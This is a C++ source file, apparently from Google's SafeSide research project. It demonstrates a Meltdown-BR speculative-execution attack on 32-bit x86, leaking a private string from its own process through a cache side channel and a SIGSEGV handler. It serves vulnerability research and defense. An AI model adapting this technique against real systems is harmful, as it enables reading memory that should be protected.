/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

/**
 * Meltdown-BR demonstrates speculation over the "bound" instruction on x86.
 * That instruction is allowed only in 32-bit mode, so the example cannot work
 * on 64-bits. We check with the "bound" instruction whether a given offset
 * belongs to the public_data string. In the case of safe offset it passes,
 * when the offset points to the private_data, the bounds check fails and
 * SIGSEGV is triggered. However, the speculative execution continues past the
 * bounds check.
 **/

#include "compiler_specifics.h"

#if !SAFESIDE_LINUX && !SAFESIDE_MAC
#  error Unsupported OS. Linux or MacOS required.
#endif

#if !SAFESIDE_IA32
#  error Unsupported architecture. 32-bit x86 required.
#endif

#include <array>
#include <cstring>
#include <iostream>

#include <signal.h>

#include "cache_sidechannel.h"
#include "instr.h"
#include "local_content.h"
#include "meltdown_local_content.h"
#include "utils.h"

// ICC requires the offset variable to be volatile. If it isn't, ICC schedules
// to spill it to stack after the second ForceRead call and that never happens
// because of the SIGSEGV and architectural jumping over that section.
// In the next loop the restore from stack spill just loads some random value
// from the stack that was not rewritten.
static char LeakByte(const char *data, volatile size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    size_t safe_offset = run % strlen(data);
    sidechannel.FlushOracle();

    // Checks bounds and accesses the safe offset. That succeeds.
    BoundsCheck(data, safe_offset);
    ForceRead(oracle.data() + static_cast<unsigned char>(data[safe_offset]));

    // Check bounds of the offset to private data. The check fails, but the
    // speculative execution continues.
    BoundsCheck(data, offset);
    ForceRead(oracle.data() + static_cast<unsigned char>(data[offset]));

    // Unreachable code.
    std::cout << "Dead code. Must not be printed." << std::endl;

    // The exit call must not be unconditional, otherwise clang would optimize
    // out everything that follows it and the linking would fail.
    if (strlen(public_data) != 0) {
      exit(EXIT_FAILURE);
    }

    // SIGSEGV signal handler moves the instruction pointer to this label.
#if SAFESIDE_LINUX
    asm volatile("afterspeculation:");
#elif SAFESIDE_MAC
    asm volatile("_afterspeculation:");
#else
#  error Unsupported OS.
#endif

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(data[safe_offset]);

    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
#if SAFESIDE_LINUX
  OnSignalMoveRipToAfterspeculation(SIGSEGV);
#elif SAFESIDE_MAC
  OnSignalMoveRipToAfterspeculation(SIGTRAP);
#else
#  error Unsupported OS.
#endif
  std::cout << "Leaking the string: ";
  std::cout.flush();
  size_t private_offset = private_data - public_data;
  for (size_t i = 0; i < strlen(private_data); ++i) {
    std::cout << LeakByte(public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
  return 0;
}
